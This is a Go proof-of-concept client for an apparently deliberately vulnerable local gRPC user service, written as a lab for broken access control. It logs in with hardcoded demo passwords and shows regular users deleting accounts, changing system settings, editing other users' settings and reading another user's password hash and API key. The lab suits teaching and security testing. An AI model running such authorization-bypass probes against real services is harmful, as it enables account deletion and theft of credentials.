package main

import (
	"context"
	"fmt"
	"log"
	"time"

	pb "grpc-vulnerable/proto"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/metadata"
)

const (
	serverAddr = "localhost:50051"
)

func main() {
	fmt.Println("==========================================")
	fmt.Println("Vulnerable gRPC Service - Proof of Concept")
	fmt.Println("==========================================")
	fmt.Println()

	// Connect to server
	conn, err := grpc.NewClient(serverAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}
	defer conn.Close()

	client := pb.NewUserServiceClient(conn)
	ctx := context.Background()

	// Test 1: Login as regular user (alice)
	fmt.Println("==========================================")
	fmt.Println("Test 1: Login as regular user (alice)")
	fmt.Println("==========================================")
	loginResp, err := client.Login(ctx, &pb.LoginRequest{
		Username: "alice",
		Password: "alice123",
	})
	if err != nil {
		log.Fatalf("Login failed: %v", err)
	}
	fmt.Printf("✓ Logged in as alice\n")
	fmt.Printf("Token: %s...\n", loginResp.Token[:50])
	fmt.Printf("User: %s (role: %s)\n", loginResp.User.Username, loginResp.User.Role)
	fmt.Println()

	aliceToken := loginResp.Token
	aliceCtx := metadata.NewOutgoingContext(ctx, metadata.Pairs("authorization", "Bearer "+aliceToken))

	// Test 2: Regular user accessing admin endpoint (VULNERABLE)
	fmt.Println("==========================================")
	fmt.Println("Test 2: Regular User Accessing Admin Endpoint")
	fmt.Println("==========================================")
	fmt.Println("Vulnerability: Missing admin role check")
	fmt.Println()

	listResp, err := client.ListAllUsers(aliceCtx, &pb.ListAllUsersRequest{})
	if err != nil {
		fmt.Printf("✗ Failed to list users: %v\n", err)
	} else {
		fmt.Printf("✓ VULNERABILITY CONFIRMED: Regular user can list all users!\n")
		fmt.Printf("Found %d users:\n", len(listResp.Users))
		for _, user := range listResp.Users {
			fmt.Printf("  - %s (%s, role: %s)\n", user.Username, user.Email, user.Role)
		}
	}
	fmt.Println()

	// Test 3: Regular user deleting users (VULNERABLE)
	fmt.Println("==========================================")
	fmt.Println("Test 3: Regular User Deleting Users")
	fmt.Println("==========================================")
	fmt.Println("Vulnerability: Missing admin authorization check")
	fmt.Println()

	deleteResp, err := client.DeleteUser(aliceCtx, &pb.DeleteUserRequest{
		UserId: 2, // Try to delete bob
	})
	if err != nil {
		fmt.Printf("✗ Failed to delete user: %v\n", err)
	} else {
		fmt.Printf("✓ VULNERABILITY CONFIRMED: Regular user can delete users!\n")
		fmt.Printf("Response: %s\n", deleteResp.Message)
	}
	fmt.Println()

	// Test 4: Regular user updating system settings (VULNERABLE)
	fmt.Println("==========================================")
	fmt.Println("Test 4: Regular User Updating System Settings")
	fmt.Println("==========================================")
	fmt.Println("Vulnerability: Missing admin authorization check")
	fmt.Println()

	settingsResp, err := client.UpdateSystemSettings(aliceCtx, &pb.UpdateSystemSettingsRequest{
		Setting: "maintenance_mode",
		Value:   "true",
	})
	if err != nil {
		fmt.Printf("✗ Failed to update settings: %v\n", err)
	} else {
		fmt.Printf("✓ VULNERABILITY CONFIRMED: Regular user can update system settings!\n")
		fmt.Printf("Response: %s\n", settingsResp.Message)
	}
	fmt.Println()

	// Test 5: User modifying other user's settings (VULNERABLE)
	fmt.Println("==========================================")
	fmt.Println("Test 5: User Modifying Other User's Settings")
	fmt.Println("==========================================")
	fmt.Println("Vulnerability: Missing ownership check")
	fmt.Println()

	updateResp, err := client.UpdateUserSettings(aliceCtx, &pb.UpdateUserSettingsRequest{
		TargetUserId: 2, // alice (user_id=1) modifying bob's (user_id=2) settings
		Setting:      "theme",
		Value:        "dark",
	})
	if err != nil {
		fmt.Printf("✗ Failed to update user settings: %v\n", err)
	} else {
		fmt.Printf("✓ VULNERABILITY CONFIRMED: User can modify other user's settings!\n")
		fmt.Printf("Response: %s\n", updateResp.Message)
	}
	fmt.Println()

	// Test 6: Regular user moderating content (VULNERABLE)
	fmt.Println("==========================================")
	fmt.Println("Test 6: Regular User Moderating Content")
	fmt.Println("==========================================")
	fmt.Println("Vulnerability: Missing moderator role check")
	fmt.Println()

	moderateResp, err := client.ModerateContent(aliceCtx, &pb.ModerateContentRequest{
		ContentId: "content123",
		Action:    "approve",
	})
	if err != nil {
		fmt.Printf("✗ Failed to moderate content: %v\n", err)
	} else {
		fmt.Printf("✓ VULNERABILITY CONFIRMED: Regular user can moderate content!\n")
		fmt.Printf("Response: %s\n", moderateResp.Message)
	}
	fmt.Println()

	// Test 7: Information disclosure (VULNERABLE)
	fmt.Println("==========================================")
	fmt.Println("Test 7: Information Disclosure")
	fmt.Println("==========================================")
	fmt.Println("Vulnerability: Exposing sensitive information")
	fmt.Println()

	detailsResp, err := client.GetUserDetails(aliceCtx, &pb.GetUserDetailsRequest{
		UserId: 2, // alice accessing bob's details
	})
	if err != nil {
		fmt.Printf("✗ Failed to get user details: %v\n", err)
	} else {
		fmt.Printf("✓ VULNERABILITY CONFIRMED: Sensitive information exposed!\n")
		fmt.Printf("User Details:\n")
		fmt.Printf("  Username: %s\n", detailsResp.Username)
		fmt.Printf("  Email: %s\n", detailsResp.Email)
		fmt.Printf("  Role: %s\n", detailsResp.Role)
		fmt.Printf("  Password Hash: %s (SHOULD NOT BE EXPOSED)\n", detailsResp.PasswordHash)
		fmt.Printf("  API Key: %s (SHOULD NOT BE EXPOSED)\n", detailsResp.ApiKey)
	}
	fmt.Println()

	// Test 8: Login as bob and try admin operations
	fmt.Println("==========================================")
	fmt.Println("Test 8: Another Regular User (bob) Accessing Admin Endpoints")
	fmt.Println("==========================================")
	fmt.Println()

	bobLoginResp, err := client.Login(ctx, &pb.LoginRequest{
		Username: "bob",
		Password: "bob123",
	})
	if err != nil {
		log.Fatalf("Login failed: %v", err)
	}
	fmt.Printf("✓ Logged in as bob\n")

	bobToken := bobLoginResp.Token
	bobCtx := metadata.NewOutgoingContext(ctx, metadata.Pairs("authorization", "Bearer "+bobToken))

	bobListResp, err := client.ListAllUsers(bobCtx, &pb.ListAllUsersRequest{})
	if err != nil {
		fmt.Printf("✗ Failed to list users: %v\n", err)
	} else {
		fmt.Printf("✓ VULNERABILITY CONFIRMED: Bob (regular user) can list all users!\n")
	}
	fmt.Println()

	// Test 9: Verify admin can access admin endpoints (Expected behavior)
	fmt.Println("==========================================")
	fmt.Println("Test 9: Admin Accessing Admin Endpoints (Expected)")
	fmt.Println("==========================================")
	fmt.Println()

	adminLoginResp, err := client.Login(ctx, &pb.LoginRequest{
		Username: "admin",
		Password: "admin123",
	})
	if err != nil {
		log.Fatalf("Login failed: %v", err)
	}
	fmt.Printf("✓ Logged in as admin\n")

	adminToken := adminLoginResp.Token
	adminCtx := metadata.NewOutgoingContext(ctx, metadata.Pairs("authorization", "Bearer "+adminToken))

	adminListResp, err := client.ListAllUsers(adminCtx, &pb.ListAllUsersRequest{})
	if err != nil {
		fmt.Printf("✗ Failed to list users: %v\n", err)
	} else {
		fmt.Printf("✓ Admin can access admin endpoints (expected behavior)\n")
		fmt.Printf("Found %d users\n", len(adminListResp.Users))
	}
	fmt.Println()

	// Summary
	fmt.Println("==========================================")
	fmt.Println("Summary")
	fmt.Println("==========================================")
	fmt.Println("Vulnerabilities confirmed:")
	fmt.Println("  1. ✓ Regular users can access admin endpoints")
	fmt.Println("  2. ✓ Regular users can delete users")
	fmt.Println("  3. ✓ Regular users can update system settings")
	fmt.Println("  4. ✓ Users can modify other users' settings")
	fmt.Println("  5. ✓ Regular users can moderate content")
	fmt.Println("  6. ✓ Sensitive information (password hash, API key) exposed")
	fmt.Println()
	fmt.Println("All authorization vulnerabilities confirmed!")
}
